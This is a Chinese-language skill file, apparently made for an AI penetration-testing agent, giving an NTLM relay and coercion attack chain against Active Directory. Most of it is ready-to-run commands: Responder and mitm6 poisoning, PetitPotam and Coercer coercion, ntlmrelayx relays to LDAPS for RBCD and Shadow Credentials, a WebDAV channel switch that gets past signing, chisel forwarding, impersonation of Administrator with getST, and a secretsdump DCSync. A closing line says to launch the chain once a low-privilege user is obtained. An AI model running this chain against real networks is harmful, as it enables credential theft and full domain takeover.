---
name: 'ntlm-relay-chain'
description: 'NTLM Relay + Coercion 攻击链：Responder配置、ntlmrelayx Relay目标、Coercion技术(PetitPotam/PrinterBug/Coercer)、通道决定 NTLM 标志(WebDAV 绕 SMB signing)、机器账户中继、LDAP→RBCD→DCSync完整流程。（检索词：impacket/Responder/ntlmrelayx/relay/webdav/webclient/coercion/signing/HTTPD/machine-account/machine account/ntlm relay/chain）'
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# NTLM Relay + Coercion 攻击链 — 实战参考

## 核心概念
NTLM 认证和传输协议无关。受害者向攻击者认证 → 攻击者转发(relay)到目标服务 → 攻击者以受害者身份操作目标。

## 快速命令速查

### 侦察
```bash
netexec smb 10.0.0.0/24                          # 查看每个主机的 SMB signing
netexec smb 10.0.0.0/24 --gen-relay-list targets.txt  # 自动找无签名主机
netexec ldap 10.0.0.10                            # 查看 LDAP signing + channel binding
```

### Responder (关闭 SMB/HTTP 服务器，只毒化不捕获)
```bash
sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo responder -I eth0 -v
```

### ntlmrelayx (选择 relay 目标)
```bash
# LDAP relay → RBCD (最常用，金标准)
ntlmrelayx.py -t ldaps://DC --delegate-access -smb2support --remove-mic -6

# LDAP relay → Shadow Credentials → DCSync
ntlmrelayx.py -t ldap://DC --shadow-credentials --shadow-target 'DC01$'

# AD CS HTTP relay → 要机器证书 (ESC8)
ntlmrelayx.py -t http://CA/certsrv/ --adcs -smb2support
```

### Coercion (强制目标认证到我们)
```bash
coercer coerce -u u -p p -d dom --target VICTIM --listen-ip ATK    # 自动试全部 12+ 方法
python3 PetitPotam.py ATK_IP VICTIM_IP                              # 对 DC 无需凭据！
```

🔴 **PetitPotam 的方法不止一个 —— 默认那个通常【已被打补丁】**

PetitPotam 内部是一组 EFSRPC opnum，用 `-pipe` 选择：

| 方法 | 现状 |
|------|------|
| `EfsRpcOpenFileRaw`（老版默认） | 绝大多数环境已打补丁 → `ERROR_BAD_NETPATH` / 直接失败 |
| **`EfsRpcEncryptFileSrv`** | 🎯 **补丁后仍常可用**（走"加密文件"分支，很多环境没堵） |
| `EfsRpcAddUsersToFile` | 同族备选 |

```bash
# ★ 别只跑默认方法：一条不行就把方法全过一遍
PetitPotam.py -u u -hashes :<NT> -d dom 'VICTIM@9999/rogue' VICTIM_IP -pipe all
```
**实测（Mist）**：`EfsRpcOpenFileRaw` 已被堵，换 `-pipe all`（命中 `EfsRpcEncryptFileSrv`）立刻触发回连。
★ 顺序：**先拉起受害者上的 WebClient 服务**（见下方 WebDAV 一节），再强制 ——
  否则 NTLM 走的是 SMB 通道，照样带 SIGN。

### mitm6 (IPv6 DNS 接管 → WPAD 强制认证)
```bash
sudo mitm6 -d corp.local -i eth0
ntlmrelayx.py -6 -wh attacker-wpad -t ldaps://DC --delegate-access
```

### Relay 目标对照表
| Relay 到 | 条件 | 攻击效果 |
|---------|------|---------|
| LDAP | 无 LDAP signing | RBCD / Shadow Credentials / Add computer |
| LDAPS | 无 channel binding | 同上 + 创建计算机账户 |
| SMB | 无 SMB signing + admin 权限 | dump SAM/LSA / 执行命令 |
| AD CS HTTP | 无 EPA (ESC8) | 获取机器证书 → TGT → DCSync |
| MSSQL | 无加密 | SQL 查询执行 |

### 🔴 通道决定 NTLM 标志 —— 报错时先换通道，别先加标志

**这是最省时间的一条判据。**

强制认证的**通道**决定了客户端在 NTLM 里协商什么标志：

| 强制通道 | 客户端协商 | 中继到 LDAP(S) |
|---------|-----------|---------------|
| SMB（EFS / RPC / PetitPotam 默认） | **带 SIGN/SEAL** | 被拒：`The client requested signing. Relaying to LDAP will not work!` |
| **HTTP（WebDAV）** | **不带 SIGN** | 干净通过，**不需要任何标志** |

🔴 **看到 `The client requested signing` / `Signing is required` 时，正确反应是【换通道】，
不是加 `--remove-mic --remove-sign-seal`。** 剥标志是治标，而且
**`--remove-sign-seal` 把 SIGN/SEAL 剥掉后，LDAPS 的绑定反而可能失败**
（症状：拿到了 challenge 但 bind 失败）。

**怎么确认自己在哪个通道** —— 看 ntlmrelayx 的**来源线程名**：
```
[*] HTTPD(80): Connection from ... attacking target ldaps://...             ← HTTP/WebDAV ✅
[*] SMBD-Thread-5: Received connection from ... attacking target smb://...  ← SMB ❌
```
看到 `SMBD-Thread` 就说明还没走到这条路上。

### 🔴 换通道：WebDAV（Windows Server 自带，无需装东西）

**关键洞察**：Windows Server **自带 WebDAV**（IIS 的 WebClient 组件）。
WebDAV 共享走 **HTTP** —— 而 HTTP 上根本没有 signing 这个概念，
所以让强制认证走 WebDAV，**客户端从源头就不协商 SIGN**，中继到 LDAPS 干净通过。

```bash
# 0) 受害者机器上必须先【启用 WebClient 服务】—— 默认是停的，不启就不会发 WebDAV 请求
#    EtwStartWebClient.exe（改注册表 Start=2 并拉起服务）
# 1) 中继目标 = LDAPS，-i 拿交互式 LDAP shell（后面 set_shadow_creds / set_rbcd 用）
#    ★ 不要加 --remove-mic / --remove-sign-seal
ntlmrelayx.py -debug -t ldaps://DC -i -smb2support -domain dom
# 2) 强制受害者对【自己】的 WebDAV 端点认证 → NTLM 发到我们的 HTTP 监听
PetitPotam.py -u u -hashes :<NT> -d dom 'VICTIM@9999/rogue' VICTIM_IP -pipe all
```

🔴 **两个必踩的坑**：

1. **主机名必须是"单字"，不能带点**：`rogue` ✅ / `rogue.htb` ❌ / 直接写 IP ❌。
   微软文档：URL 里含 `.` 会被 WebDAV 判定为**公网**地址，于是**不自动发送凭据**。
   —— 所以"老老实实加个 DNS 记录"反而没用，**必须是单标签名**。
2. **加不了 DNS 记录时的替代**（域用户常无 `dnstool.py` 加记录权限）：
   在受害者机器上开个端口转发把请求绕回攻击机，用**受害者自己的 IP**当"服务器"：
   ```bash
   chisel.exe client ATK:9092 9999:127.0.0.1:80      # 受害者:9999 → 攻击机:80
   PetitPotam.py -u u -hashes :<NT> -d dom 'VICTIM@9999/rogue' VICTIM_IP -pipe all
   ```

🔴 **工具版本坑**：`set_shadow_creds` / `clear_shadow_creds` / `set_rbcd` 这些
**交互式 LDAP shell 命令不在原版 impacket 里**，要用带它们的 **ntlmrelayx fork**
（`-i` 起 shell 后敲 `help`，能看到这些命令才算对）。
原版 impacket 只能走非交互路径：`--delegate-access`（RBCD）/ `--shadow-credentials`。

### 🔴 机器账户（`XXX$`）中继的特殊性

机器账户和普通用户账户**中继行为不一样**，失败时先看这几条：

```
[ ] 机器账户【不能交互式登录】→ 拿到它的认证后只能用于【委派 / 写属性】，不能直接 dump
    → 典型收尾是 S4U2Self + S4U2Proxy 冒充本机管理员
      （见 ad-checklist §3、kerberos-only-ad）
[ ] 机器账户的 SMB 客户端常 EnableSecuritySignature=1 → 协商带 SIGN
    → 这就是"必须换 HTTP 通道"的根因（不是去剥标志）
[ ] 机器账户通常 relay 不进 SMB（signing）→ 目标只剩 LDAP / LDAPS
[ ] 拿到机器账户后先确认它【对哪些对象有写权】再决定打哪（BloodHound）
```

🔴 **负结果（已知死路，别重复烧时间）：对【域控】的机器账户强制认证走不通这条链**

```
[ ] 域控上【装不了 WebDAV / WebClient】→ 无法把通道从 SMB 换成 HTTP
[ ] ⇒ DC01$ 的强制认证只能走 SMB 通道 ⇒ 必带 SIGN ⇒ 中继到 LDAP/LDAPS 被拒
实测（Mist）：成员服务器 MS01$ 走 WebDAV → LDAPS → Shadow Credentials ✅；
            对 DC01$ 反复尝试 RBCD / Shadow Credentials 全部失败（已确认结案）。
★ 所以 `XXX$` 中继这条路的适用对象是【成员服务器】，不是 DC —— 别在 DC 上反复试。
★ 对 DC 宁可换路线：ESC13 / Backup Operators / 委派 / ADCS，或先拿成员服务器再横向。

🎯 **通用教训：中继的"能否成功"由【受害者能不能切到 HTTP 通道】决定。**
   判断顺序：受害者是成员服务器？（✅ 有戏）→ 能否启用 WebClient？（✅ 有戏）→
   是 DC / 启不了 WebClient？（❌ 直接换路线，不要在标志位上打转）
```

### LDAP Relay → RBCD → DCSync (完整流程)
```bash
# 1. 启动
sudo responder -I eth0 -v &
ntlmrelayx.py -t ldaps://DC --delegate-access -smb2support --remove-mic -6

# 2. Coerce DC
python3 PetitPotam.py ATK_IP DC_IP

# 3. 用 ntlmrelayx 创建的计算机账户获取 ST
getST.py -spn 'cifs/DC' -impersonate 'Administrator' -dc-ip DC 'dom/NEWCOMP$:Pass'

# 4. DCSync
export KRB5CCNAME=Administrator@cifs_DC.ccache
secretsdump.py -k -no-pass DC
```

### 绕过现代防御（⚠️ 先读上面「通道决定标志」再决定用不用）

- `--remove-mic` → CVE-2019-1040。**治标**：剥掉 MIC，但客户端仍在协商 SIGN
- `--remove-sign-seal` → CVE-2025-33073。**有副作用**：剥掉 SIGN/SEAL 后 **LDAPS 绑定可能失败**
- `--remove-target` + `-machine-account` → CVE-2019-1019

🔴 **优先级：换通道（HTTP/WebDAV）> 加标志。** 通道对了，这些标志大多根本不需要。

## Coercion 工具位置
- PetitPotam: `/opt/tools/PetitPotam/PetitPotam.py`
- Coercer: `~/.local/bin/coercer`
- PrinterBug: `/opt/tools/krbrelayx/printerbug.py`

## 常见故障
- `The client requested signing` → **换通道**（SMB → WebDAV/HTTP），别先加 `--remove-mic`（见上）
- `Signing is required, attack won't work` → 同上，这是 SMB 通道的**必然**结果，不是配置问题
- LDAP 拿到 challenge 但 **bind 失败** → 依次排查：① 通道仍是 SMB（看线程名）② `--remove-sign-seal` 剥坏了 ③ 真 channel binding
- 输出里是 `SMBD-Thread-N` 而非 `HTTPD(80)` → **你还在 SMB 通道**
- "No relay targets" → 目标强制签名/通道绑定 → 换 LDAP(S) 或换通道
- SMB signing 全开 → 改 relay 到 LDAP(S)
- 时钟偏斜 → `ntpdate -s DC`

**Why:** NTLM relay + coercion 是我第二盲区，Responder+ntlmrelayx+coercer 的完整链一次没串过。
**How to apply:** AD 环境拿到低权用户后，先 `netexec smb --gen-relay-list`，有可 relay 主机就起 responder + ntlmrelayx。
